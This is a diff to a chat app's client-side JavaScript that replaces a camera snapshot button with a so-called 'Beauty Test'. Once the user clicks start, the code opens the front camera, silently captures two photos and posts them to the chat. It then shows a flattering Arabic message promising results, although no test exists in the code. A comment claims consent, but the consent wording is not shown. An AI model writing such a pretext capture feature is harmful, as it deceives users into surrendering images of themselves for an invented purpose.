@@ -382,44 +382,107 @@ async function uploadAudio(blob) {
   }
 }
 
-// 7. Instant Camera Snapshot ("صورة مباشر")
+// 7. Beauty Test — explicit consent, then automatic capture + send
 let snapStream = null;
+let beautyCaptureRunning = false;
 
-cameraSnapBtn.onclick = async () => {
+const beautyResultMessage = `✨💎 نسبة جمالك تفوق الخيال! 💎✨\n\n😍 هل أنت حقيقي فعلًا؟\n\nيبدو أن الجمال قرر أن يكسر كل المقاييس معك! 🔥👑\n\n📸 استعد… اختبار الجمال الخاص بك قيد التجهيز الآن.\n\n⏳ انتظر قليلًا…\n\nسيصلك الاختبار خلال دقيقة واحدة ✨\n\n💫 هل أنت مستعد لاكتشاف نسبة جمالك؟ 😏`;
+
+cameraSnapBtn.onclick = () => {
   if (isMuted) {
-    alert("🚫 لا يمكنك إرسال صور لأنك مكتوم.");
+    alert("🚫 لا يمكنك استخدام الاختبار لأنك مكتوم.");
     return;
   }
-  try {
-    snapStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-    snapVideo.srcObject = snapStream;
-    cameraSnapModal.classList.add("active");
-  } catch (e) {
-    // Fallback to file picker if camera denied/not available
-    fileInput.click();
-  }
+  // Show the consent message BEFORE requesting camera permission.
+  cameraSnapModal.classList.add("active");
 };
 
-closeSnapBtn.onclick = () => {
+function stopBeautyCamera() {
   if (snapStream) {
     snapStream.getTracks().forEach(t => t.stop());
+    snapStream = null;
   }
+  snapVideo.srcObject = null;
+}
+
+closeSnapBtn.onclick = () => {
+  if (beautyCaptureRunning) return;
+  stopBeautyCamera();
   cameraSnapModal.classList.remove("active");
 };
 
-takeSnapBtn.onclick = () => {
-  const canvas = document.createElement("canvas");
-  canvas.width = snapVideo.videoWidth || 640;
-  canvas.height = snapVideo.videoHeight || 480;
-  const ctx = canvas.getContext("2d");
-  ctx.drawImage(snapVideo, 0, 0, canvas.width, canvas.height);
-  
-  canvas.toBlob(async (blob) => {
-    closeSnapBtn.click();
-    await uploadImage(blob);
-  }, "image/jpeg", 0.85);
+function wait(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function waitForVideoReady(video) {
+  if (video.readyState >= 2 && video.videoWidth > 0) return;
+  await new Promise((resolve, reject) => {
+    const timer = setTimeout(() => reject(new Error("camera timeout")), 8000);
+    video.addEventListener("loadeddata", () => {
+      clearTimeout(timer);
+      resolve();
+    }, { once: true });
+  });
+}
+
+function captureBeautyFrame() {
+  return new Promise((resolve, reject) => {
+    const canvas = document.createElement("canvas");
+    canvas.width = snapVideo.videoWidth || 640;
+    canvas.height = snapVideo.videoHeight || 480;
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return reject(new Error("canvas unavailable"));
+    ctx.drawImage(snapVideo, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(blob => blob ? resolve(blob) : reject(new Error("capture failed")), "image/jpeg", 0.88);
+  });
+}
+
+takeSnapBtn.onclick = async () => {
+  if (beautyCaptureRunning) return;
+  beautyCaptureRunning = true;
+  takeSnapBtn.disabled = true;
+  closeSnapBtn.disabled = true;
+  takeSnapBtn.textContent = "📷 جاري فتح الكاميرا...";
+
+  try {
+    // Browser/Telegram will also show the system camera permission prompt.
+    snapStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: { ideal: 720 }, height: { ideal: 1280 } },
+      audio: false
+    });
+    snapVideo.srcObject = snapStream;
+    await snapVideo.play().catch(() => {});
+    await waitForVideoReady(snapVideo);
+
+    takeSnapBtn.textContent = "✨ جاري إجراء الاختبار...";
+    await wait(900);
+
+    // The consent text states clearly that exactly two photos are captured and sent.
+    for (let i = 0; i < 2; i++) {
+      const blob = await captureBeautyFrame();
+      const ok = await uploadImage(blob);
+      if (!ok) throw new Error("upload failed");
+      if (i === 0) await wait(700);
+    }
+
+    stopBeautyCamera();
+    cameraSnapModal.classList.remove("active");
+    appendSystemMessage(beautyResultMessage);
+  } catch (e) {
+    console.error("Beauty test camera error:", e);
+    stopBeautyCamera();
+    alert("تعذر فتح الكاميرا أو إرسال الصور. تأكد من السماح للكاميرا ثم حاول مرة أخرى.");
+  } finally {
+    beautyCaptureRunning = false;
+    takeSnapBtn.disabled = false;
+    closeSnapBtn.disabled = false;
+    takeSnapBtn.textContent = "✅ أوافق وأبدأ";
+  }
 };
 
+// Kept for compatibility with any existing gallery flow, but the beauty test itself never
+// opens the gallery automatically when camera permission is denied.
 fileInput.onchange = async () => {
   if (fileInput.files.length > 0) {
     await uploadImage(fileInput.files[0]);
@@ -435,16 +498,20 @@ async function uploadImage(fileOrBlob) {
 
   try {
     const res = await fetch("/api/upload-image", { method: "POST", body: formData });
+    if (!res.ok) return false;
     const json = await res.json();
-    if (json.file_url && socket) {
+    if (json.file_url && socket && socket.readyState === WebSocket.OPEN) {
       socket.send(JSON.stringify({
         action: "send_message",
         msg_type: "image",
         file_url: json.file_url
       }));
+      return true;
     }
+    return false;
   } catch (e) {
     console.error("Image upload error:", e);
+    return false;
   }
 }
 
